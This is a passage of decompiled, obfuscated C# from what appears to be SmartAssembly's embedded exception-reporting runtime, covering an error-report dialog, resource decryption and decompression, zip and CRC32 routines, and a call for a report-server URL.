using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns0;
using ns1;
using ns10;
using ns11;
using ns12;
using ns13;
using ns14;
using ns3;
using ns5;
using ns8;
using ns9;

internal class Class12
{
	static int smethod_0(Class33.Class40 class40_0, int int_0)
	{
		if (int_0 == 255)
		{
			return 285;
		}
		int num = 257;
		while (int_0 >= 8)
		{
			num += 4;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	[DllImport("gdi32.dll")]
	internal static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_1(string string_0, Control0 control0_0)
	{
		control0_0.string_0 = string_0;
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = (Image)(object)Class12.smethod_91((string_0.Length > 0) ? Class32.smethod_0(297) : Class32.smethod_0(292));
		control0_0.bool_1 = true;
		control0_0.bool_0 = true;
		if (string_0.Length > 0)
		{
			((Control)control0_0).set_Height(100);
		}
		((Control)control0_0).Refresh();
	}

	[DllImport("kernel32.Dll")]
	internal static extern short GetVersionEx(ref Class59.Struct24 struct24_0);

	static byte[] smethod_2(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class12.smethod_100(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class33.Stream0 stream = new Class33.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class12.smethod_71(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class12.smethod_162(stream);
			int num3 = Class12.smethod_162(stream);
			int num4 = Class12.smethod_162(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class12.smethod_71(stream);
			Class12.smethod_71(stream);
			Class12.smethod_71(stream);
			int num5 = Class12.smethod_71(stream);
			int num6 = Class12.smethod_162(stream);
			int num7 = Class12.smethod_162(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class33.Class34 class34_ = new Class33.Class34(array2);
			array = new byte[num5];
			Class12.smethod_51(array.Length, 0, class34_, array);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class12.smethod_71(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class12.smethod_71(stream);
					num11 = Class12.smethod_71(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class33.Class34 class34_2 = new Class33.Class34(array3);
					Class12.smethod_51(num11, i, class34_2, array);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 197, 61, 136, 152, 206, 187, 189, 242 };
				byte[] byte_2 = new byte[8] { 137, 247, 166, 58, 242, 5, 62, 50 };
				using ICryptoTransform cryptoTransform = Class12.smethod_99(bool_0: true, byte_, byte_2);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class12.smethod_2(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class12.smethod_85(byte_5, bool_0: true, byte_4);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class12.smethod_2(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static void smethod_3(Form0 form0_0)
	{
		//IL_07c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ca: Expected O, but got Unknown
		while (true)
		{
			((Control)form0_0.panel_0).SuspendLayout();
			while (true)
			{
				((Control)form0_0.panel_1).SuspendLayout();
				((Control)form0_0).SuspendLayout();
				form0_0.control1_0.IconState = Enum5.const_1;
				form0_0.control1_1.IconState = Enum5.const_1;
				((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
				((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
				while (true)
				{
					((Control)form0_0.checkBox_0).set_Location(new Point(22, 98));
					((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
					((Control)form0_0.checkBox_0).set_TabIndex(13);
					((Control)form0_0.checkBox_0).set_Text(Class32.smethod_0(306));
					form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_5);
					((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
					while (true)
					{
						form0_0.label_0.set_FlatStyle((FlatStyle)3);
						((Control)form0_0.label_0).set_Font(new Font(Class32.smethod_0(367), 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
						((Control)form0_0.label_0).set_Location(new Point(20, 124));
						((Control)form0_0.label_0).set_Size(new Size(381, 16));
						((Control)form0_0.label_0).set_Text(string.Format(Class32.smethod_0(396), Class32.smethod_0(445)));
						((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
						((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
						((Control)form0_0.button_0).set_Size(new Size(75, 24));
						while (true)
						{
							((Control)form0_0.button_0).set_Location(new Point(400 - ((Control)form0_0.button_0).get_Width(), 205));
							while (true)
							{
								((Control)form0_0.button_0).set_TabIndex(4);
								((Control)form0_0.button_0).set_Text(Class32.smethod_0(454));
								while (true)
								{
									((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_2);
									while (true)
									{
										((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
										((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
										((Control)form0_0.button_1).set_Size(new Size(105, 24));
										((Control)form0_0.button_1).set_Location(new Point(((Control)form0_0.button_0).get_Left() - ((Control)form0_0.button_1).get_Width() - 6, 205));
										((Control)form0_0.button_1).set_TabIndex(3);
										((Control)form0_0.button_1).set_Text(Class32.smethod_0(471));
										while (true)
										{
											((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_1);
											((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
											while (true)
											{
												((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
												((Control)form0_0.button_6).set_Size(new Size(64, 24));
												((Control)form0_0.button_6).set_Location(new Point(((Control)form0_0.button_1).get_Left() - ((Control)form0_0.button_6).get_Width() - 6, 205));
												while (true)
												{
													((Control)form0_0.button_6).set_TabIndex(14);
													((Control)form0_0.button_6).set_Text(Class32.smethod_0(496));
													((Control)form0_0.button_6).set_Visible(false);
													((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
													((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
													form0_0.label_1.set_FlatStyle((FlatStyle)3);
													((Control)form0_0.label_1).set_Location(new Point(20, 140));
													((Control)form0_0.label_1).set_Size(new Size(381, 55));
													((Control)form0_0.label_1).set_Text(string.Format(Class32.smethod_0(505), Class32.smethod_0(445)));
													((Control)form0_0.class55_0).set_Anchor((AnchorStyles)13);
													((Control)form0_0.class55_0).set_Location(new Point(20, 69));
													((Control)form0_0.class55_0).set_Size(new Size(381, 13));
													while (true)
													{
														((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
														((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
														while (true)
														{
															((Control)form0_0.button_2).set_Size(new Size(80, 24));
															((Control)form0_0.button_2).set_Location(new Point(400 - ((Control)form0_0.button_2).get_Width(), 205));
															((Control)form0_0.button_2).set_TabIndex(7);
															int num = 20;
															if (!HOU2tiJgKu5JybMaDZ())
															{
															}
															while (true)
															{
																switch (num)
																{
																case 28:
																	((Control)form0_0.panel_0).set_Size(new Size(413, 240));
																	((Control)form0_0.panel_0).set_TabIndex(0);
																	((Control)form0_0.panel_1).get_Controls().AddRange((Control[])(object)new Control[10]
																	{
																		(Control)form0_0.button_2,
																		(Control)form0_0.button_3,
																		(Control)form0_0.button_4,
																		(Control)form0_0.button_5,
																		form0_0.control3_0,
																		form0_0.control1_1,
																		form0_0.control0_0,
																		form0_0.control0_1,
																		form0_0.control0_2,
																		form0_0.control0_3
																	});
																	goto case 24;
																case 24:
																	((Control)form0_0.panel_1).set_Size(new Size(413, 240));
																	((Control)form0_0.panel_1).set_TabIndex(2);
																	goto case 15;
																case 15:
																	((Control)form0_0.panel_1).set_Visible(false);
																	((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
																	goto case 3;
																case 3:
																	((Form)form0_0).set_ClientSize(new Size(434, 488));
																	((Form)form0_0).set_ControlBox(false);
																	((Control)form0_0).get_Controls().AddRange((Control[])(object)new Control[3]
																	{
																		form0_0.control2_0,
																		(Control)form0_0.panel_0,
																		(Control)form0_0.panel_1
																	});
																	((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
																	((Form)form0_0).set_ShowInTaskbar(false);
																	((Form)form0_0).set_MinimizeBox(false);
																	num = 12;
																	if (eDGT3VIwkRhN3e5ONQ())
																	{
																		continue;
																	}
																	break;
																case 27:
																	((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
																	((Control)form0_0.button_4).set_Location(((Control)form0_0.button_3).get_Location());
																	goto case 11;
																case 11:
																	((Control)form0_0.button_4).set_Size(((Control)form0_0.button_3).get_Size());
																	((Control)form0_0.button_4).set_TabIndex(5);
																	goto case 2;
																case 2:
																	((Control)form0_0.button_4).set_Text(Class32.smethod_0(733));
																	((Control)form0_0.button_4).set_Visible(false);
																	((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_10);
																	goto case 17;
																case 17:
																case 19:
																	((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
																	((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
																	((Control)form0_0.button_5).set_Location(((Control)form0_0.button_3).get_Location());
																	((Control)form0_0.button_5).set_Size(((Control)form0_0.button_3).get_Size());
																	goto case 16;
																case 16:
																	((Control)form0_0.button_5).set_TabIndex(5);
																	((Control)form0_0.button_5).set_Text(Class32.smethod_0(742));
																	((Control)form0_0.button_5).set_Visible(false);
																	goto case 22;
																case 22:
																	((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_0);
																	goto case 7;
																case 7:
																	((Control)form0_0.control3_0).set_Location(new Point(87, 146));
																	((Control)form0_0.control3_0).set_Visible(false);
																	((Control)form0_0.control0_0).SetBounds(24, 72, 368, 16);
																	((Control)form0_0.control0_1).SetBounds(24, 96, 368, 16);
																	((Control)form0_0.control0_2).SetBounds(24, 120, 368, 16);
																	((Control)form0_0.control0_3).SetBounds(24, 144, 368, 16);
																	((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
																	((Control)form0_0.control2_0).SetBounds(20, 444, 120, 32);
																	((Control)form0_0.panel_0).get_Controls().AddRange((Control[])(object)new Control[8]
																	{
																		(Control)form0_0.button_6,
																		(Control)form0_0.checkBox_0,
																		(Control)form0_0.label_0,
																		(Control)form0_0.button_0,
																		(Control)form0_0.button_1,
																		(Control)form0_0.label_1,
																		(Control)form0_0.class55_0,
																		form0_0.control1_0
																	});
																	goto case 28;
																case 20:
																	((Control)form0_0.button_2).set_Text(Class32.smethod_0(715));
																	((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_3);
																	((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
																	((Control)form0_0.button_3).set_Enabled(false);
																	((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
																	((Control)form0_0.button_3).set_Size(new Size(105, 24));
																	((Control)form0_0.button_3).set_Location(new Point(((Control)form0_0.button_2).get_Left() - ((Control)form0_0.button_3).get_Width() - 6, 205));
																	((Control)form0_0.button_3).set_TabIndex(6);
																	((Control)form0_0.button_3).set_Text(Class32.smethod_0(728));
																	((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_4);
																	((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
																	num = 27;
																	if (HOU2tiJgKu5JybMaDZ())
																	{
																	}
																	continue;
																default:
																	num = 11;
																	if (!HOU2tiJgKu5JybMaDZ())
																	{
																		continue;
																	}
																	goto case 29;
																case 5:
																	break;
																case 18:
																	goto end_IL_04d9;
																case 25:
																	goto end_IL_0533;
																case 23:
																	goto end_IL_054e;
																case 8:
																case 26:
																	goto end_IL_063b;
																case 21:
																	goto end_IL_068e;
																case 6:
																	goto end_IL_06b4;
																case 0:
																	goto end_IL_0735;
																case 9:
																	goto end_IL_0751;
																case 14:
																	goto end_IL_0774;
																case 4:
																	goto end_IL_079c;
																case 10:
																	goto end_IL_084b;
																case 1:
																	goto end_IL_08c1;
																case 12:
																	((Form)form0_0).set_MaximizeBox(false);
																	goto case 29;
																case 29:
																	((Form)form0_0).set_StartPosition((FormStartPosition)1);
																	((Control)form0_0).set_Text(Class32.smethod_0(759));
																	if (((Control)form0_0).get_Text().Length == 0)
																	{
																		goto case 13;
																	}
																	goto IL_0952;
																case 13:
																	((Control)form0_0).set_Text(Class32.smethod_0(764));
																	goto IL_0952;
																case 30:
																	return;
																	IL_0952:
																	try
																	{
																		((Form)form0_0).set_TopMost(true);
																	}
																	catch
																	{
																	}
																	((Control)form0_0.panel_0).ResumeLayout(false);
																	((Control)form0_0.panel_1).ResumeLayout(false);
																	((Control)form0_0).ResumeLayout(false);
																	((Control)form0_0.button_4).BringToFront();
																	((Control)form0_0.button_5).BringToFront();
																	((Form)form0_0).set_Size(new Size(419, 264));
																	((Control)form0_0.panel_1).set_Dock((DockStyle)5);
																	((Control)form0_0.panel_0).set_Dock((DockStyle)5);
																	return;
																}
																break;
															}
															continue;
															end_IL_04d9:
															break;
														}
														continue;
														end_IL_0533:
														break;
													}
													continue;
													end_IL_054e:
													break;
												}
												continue;
												end_IL_063b:
												break;
											}
											continue;
											end_IL_068e:
											break;
										}
										continue;
										end_IL_06b4:
										break;
									}
									continue;
									end_IL_0735:
									break;
								}
								continue;
								end_IL_0751:
								break;
							}
							continue;
							end_IL_0774:
							break;
						}
						continue;
						end_IL_079c:
						break;
					}
					continue;
					end_IL_084b:
					break;
				}
				continue;
				end_IL_08c1:
				break;
			}
		}
	}

	static int smethod_4(int int_0, int int_1, byte[] byte_0, Class33.Class36 class36_0)
	{
		int num = class36_0.int_0;
		if (int_0 > class36_0.int_1)
		{
			int_0 = class36_0.int_1;
		}
		else
		{
			num = (class36_0.int_0 - class36_0.int_1 + int_0) & 0x7FFF;
		}
		int num2 = int_0;
		int num3 = int_0 - num;
		if (num3 > 0)
		{
			Array.Copy(class36_0.byte_0, 32768 - num3, byte_0, int_1, num3);
			int_1 += num3;
			int_0 = num;
		}
		Array.Copy(class36_0.byte_0, num - int_0, byte_0, int_1, int_0);
		class36_0.int_1 -= num2;
		if (class36_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static int smethod_5(Class33.Class40.Class41 class41_0)
	{
		int num = 0;
		for (int i = 0; i < class41_0.short_0.Length; i++)
		{
			num += class41_0.short_0[i] * class41_0.byte_0[i];
		}
		return num;
	}

	static Class33.Class37 smethod_6(Class33.Class38 class38_0)
	{
		byte[] array = new byte[class38_0.int_4];
		Array.Copy(class38_0.byte_1, class38_0.int_3, array, 0, class38_0.int_4);
		return new Class33.Class37(array);
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static string smethod_7()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class31.SubkeyApplication);
			int num = 1;
			if (!HOU2tiJgKu5JybMaDZ())
			{
			}
			string result2 = default(string);
			string result = default(string);
			while (true)
			{
				switch (num)
				{
				default:
					num = 4;
					if (!HOU2tiJgKu5JybMaDZ())
					{
						break;
					}
					goto case 0;
				case 0:
				case 1:
					if (registryKey == null)
					{
						goto case 3;
					}
					goto IL_005d;
				case 3:
					registryKey = Registry.LocalMachine.OpenSubKey(Class31.WowSubkeyApplication);
					goto IL_005d;
				case 5:
					return result2;
				case 2:
				case 4:
					{
						return result;
					}
					IL_005d:
					if (registryKey == null)
					{
						return null;
					}
					result2 = (string)registryKey.GetValue(Class32.smethod_0(785), null);
					registryKey.Close();
					goto case 5;
				}
			}
		}
		catch
		{
			return null;
		}
	}

	static int smethod_8(int int_0, Graphics graphics_0, Font font_0, string string_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	static void smethod_9(Exception exception_0, object object_0, object object_1)
	{
		Class12.smethod_138(exception_0, new object[2] { object_0, object_1 });
	}

	static void smethod_10(Class33.Class42 class42_0)
	{
		class42_0.int_0 = (class42_0.byte_0[class42_0.int_4] << 5) ^ class42_0.byte_0[class42_0.int_4 + 1];
	}

	static byte[] smethod_11(Class47 class47_0)
	{
		return class47_0.method_4();
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_1([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static bool smethod_12(Class33.Class42 class42_0, int int_0)
	{
		int num = 128;
		int num2 = 128;
		int num9 = default(int);
		while (true)
		{
			short[] short_ = class42_0.short_1;
			while (true)
			{
				int num3 = class42_0.int_4;
				while (true)
				{
					int num4 = class42_0.int_4 + class42_0.int_2;
					int num5 = Math.Max(class42_0.int_2, 2);
					int num6 = Math.Max(class42_0.int_4 - 32506, 0);
					int num7 = class42_0.int_4 + 258 - 1;
					byte b = class42_0.byte_0[num4 - 1];
					byte b2 = class42_0.byte_0[num4];
					if (num5 >= 8)
					{
						goto IL_0216;
					}
					goto IL_0231;
					IL_0231:
					if (num2 <= class42_0.int_5)
					{
						goto IL_0011;
					}
					num2 = class42_0.int_5;
					int num8 = 1;
					if (HOU2tiJgKu5JybMaDZ())
					{
					}
					goto IL_01d8;
					IL_02b5:
					class42_0.int_2 = Math.Min(num5, class42_0.int_5);
					goto IL_02c8;
					IL_0011:
					if (class42_0.byte_0[int_0 + num5] != b2 || class42_0.byte_0[int_0 + num5 - 1] != b)
					{
						goto IL_0022;
					}
					goto IL_0059;
					IL_012f:
					if (num3 <= num4)
					{
						goto IL_01cc;
					}
					class42_0.int_1 = int_0;
					num4 = num3;
					num5 = num3 - class42_0.int_4;
					if (num5 < num2)
					{
						b = class42_0.byte_0[num4 - 1];
						b2 = class42_0.byte_0[num4];
						num8 = 5;
						if (!eDGT3VIwkRhN3e5ONQ())
						{
							goto IL_0011;
						}
						goto IL_01d8;
					}
					goto IL_02b5;
					IL_0059:
					if (class42_0.byte_0[int_0] != class42_0.byte_0[num3] || class42_0.byte_0[int_0 + 1] != class42_0.byte_0[num3 + 1])
					{
						goto IL_0022;
					}
					num9 = int_0 + 2;
					goto IL_0085;
					IL_01cc:
					num3 = class42_0.int_4;
					goto IL_0022;
					IL_0022:
					if ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > num6 && --num != 0)
					{
						goto IL_0011;
					}
					goto IL_02b5;
					IL_0085:
					num3 += 2;
					goto IL_0089;
					IL_0089:
					if (class42_0.byte_0[++num3] == class42_0.byte_0[++num9] && class42_0.byte_0[++num3] == class42_0.byte_0[++num9] && class42_0.byte_0[++num3] == class42_0.byte_0[++num9] && class42_0.byte_0[++num3] == class42_0.byte_0[++num9] && class42_0.byte_0[++num3] == class42_0.byte_0[++num9] && class42_0.byte_0[++num3] == class42_0.byte_0[++num9])
					{
						goto IL_00f3;
					}
					goto IL_012f;
					IL_01d8:
					switch (num8)
					{
					case 1:
						break;
					default:
						goto IL_0059;
					case 9:
						goto IL_0085;
					case 10:
						goto IL_00f3;
					case 8:
					case 11:
						goto IL_012f;
					case 5:
						goto IL_01cc;
					case 0:
						goto IL_0216;
					case 2:
					case 7:
						continue;
					case 4:
						goto end_IL_023f;
					case 3:
						goto end_IL_02a2;
					case 12:
						goto IL_02c8;
					}
					goto IL_0011;
					IL_0216:
					num >>= 2;
					goto IL_0231;
					IL_00f3:
					if (class42_0.byte_0[++num3] == class42_0.byte_0[++num9] && class42_0.byte_0[++num3] == class42_0.byte_0[++num9] && num3 < num7)
					{
						goto IL_0089;
					}
					goto IL_012f;
					IL_02c8:
					return class42_0.int_2 >= 3;
					continue;
					end_IL_023f:
					break;
				}
				continue;
				end_IL_02a2:
				break;
			}
		}
	}

	static void smethod_13(Delegate21 delegate21_0, Class58 class58_0)
	{
		if (class58_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class58_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class58_0.iwebProxy_0);
				}
				class58_0.string_2 = uploadReportLoginService.GetServerURL(class58_0.string_1);
				if (class58_0.string_2.Length == 0)
				{
					throw new ApplicationException(Class32.smethod_0(794));
				}
				if (class58_0.string_2 == Class32.smethod_0(835))
				{
					class58_0.string_2 = Class58.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate21_0(Class32.smethod_0(844) + ex.Message);
				return;
			}
		}
		delegate21_0(class58_0.string_2.StartsWith(Class32.smethod_0(861)) ? class58_0.string_2 : Class32.smethod_0(866));
	}

	static void smethod_14(Exception exception_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class56.string_0 == Class32.smethod_0(871)) || !Class56.Handler.method_2((SecurityException)exception_0))
		{
			Class56.Handler.method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static string smethod_15(string string_0)
	{
		if (string_0.StartsWith(Class32.smethod_0(876)) && string_0.EndsWith(Class32.smethod_0(897)))
		{
			return Class32.smethod_0(918);
		}
		return string_0;
	}

	static void smethod_16(string string_0, Class47 class47_0, string string_1)
	{
		if (File.Exists(string_0))
		{
			Class47.Struct20 value = new Class47.Struct20(string_0);
			class47_0.dictionary_1.Add(string_1, value);
		}
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_2([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_17(Exception exception_0, object object_0)
	{
		Class12.smethod_138(exception_0, new object[1] { object_0 });
	}

	static byte[] smethod_18(byte[] byte_0, byte[] byte_1, int int_0, byte[] byte_2)
	{
		try
		{
			Class33.Stream0 stream = new Class33.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class33.Class39 class2 = new Class33.Class39();
				DateTime now = DateTime.Now;
				long num3 = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				uint num4 = uint.MaxValue;
				uint num5 = uint.MaxValue;
				int num6 = 0;
				int num7 = byte_2.Length;
				while (--num7 >= 0)
				{
					num5 = array8[(num5 ^ byte_2[num6++]) & 0xFF] ^ (num5 >> 8);
				}
				num5 ^= num4;
				Class12.smethod_56(stream, 67324752);
				Class12.smethod_44(20, stream);
				Class12.smethod_44(0, stream);
				Class12.smethod_44(8, stream);
				Class12.smethod_56(stream, (int)num3);
				Class12.smethod_56(stream, (int)num5);
				long position3 = stream.Position;
				Class12.smethod_56(stream, 0);
				Class12.smethod_56(stream, byte_2.Length);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class12.smethod_44(bytes.Length, stream);
				Class12.smethod_44(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class12.smethod_41(class2, byte_2);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					int num8 = Class12.smethod_124(array9, class2);
					if (num8 <= 0)
					{
						break;
					}
					stream.Write(array9, 0, num8);
				}
				Class12.smethod_146(class2);
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					int num9 = Class12.smethod_124(array10, class2);
					if (num9 <= 0)
					{
						break;
					}
					stream.Write(array10, 0, num9);
				}
				long totalOut = class2.TotalOut;
				Class12.smethod_56(stream, 33639248);
				Class12.smethod_44(20, stream);
				Class12.smethod_44(20, stream);
				Class12.smethod_44(0, stream);
				Class12.smethod_44(8, stream);
				Class12.smethod_56(stream, (int)num3);
				Class12.smethod_56(stream, (int)num5);
				Class12.smethod_56(stream, (int)totalOut);
				Class12.smethod_56(stream, byte_2.Length);
				Class12.smethod_44(bytes.Length, stream);
				Class12.smethod_44(0, stream);
				Class12.smethod_44(0, stream);
				Class12.smethod_44(0, stream);
				Class12.smethod_44(0, stream);
				Class12.smethod_56(stream, 0);
				Class12.smethod_56(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class12.smethod_56(stream, 101010256);
				Class12.smethod_44(0, stream);
				Class12.smethod_44(0, stream);
				Class12.smethod_44(1, stream);
				Class12.smethod_44(1, stream);
				Class12.smethod_56(stream, 46 + bytes.Length);
